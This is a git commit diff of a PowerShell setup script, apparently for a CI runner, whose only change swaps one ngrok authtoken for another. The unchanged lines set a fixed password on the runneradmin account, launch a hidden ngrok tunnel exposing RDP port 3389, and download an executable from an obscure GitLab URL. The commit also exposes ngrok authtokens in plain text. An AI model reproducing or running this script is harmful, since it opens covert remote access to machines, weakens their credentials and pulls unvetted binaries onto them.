dff90c9dbff85193883c32ff95c8eb046fe855cc
xxmichalreal <167646002+xxmichalreal@users.noreply.github.com>
2024-04-20 12:05:33 -0700

    Update setup.ps1

--- setup.ps1
+++ setup.ps1
@@ -1,6 +1,6 @@
 cmd /c net user runneradmin P@ssw0rd!
 choco install ngrok -y
-ngrok config add-authtoken 2dumqfNwOrYeLZWxq5jCHAJvnq2_3SSomQfvvbASdUDZiQMT
+ngrok config add-authtoken 2XQbS6Ddy6tJENbVXc0VsUQWrEk_3Nz5sD2SUo6VHd6HSvArk
 Start-Process -FilePath "ngrok.exe" -ArgumentList "tcp 3389" -WindowStyle Hidden
 sleep 240
 curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
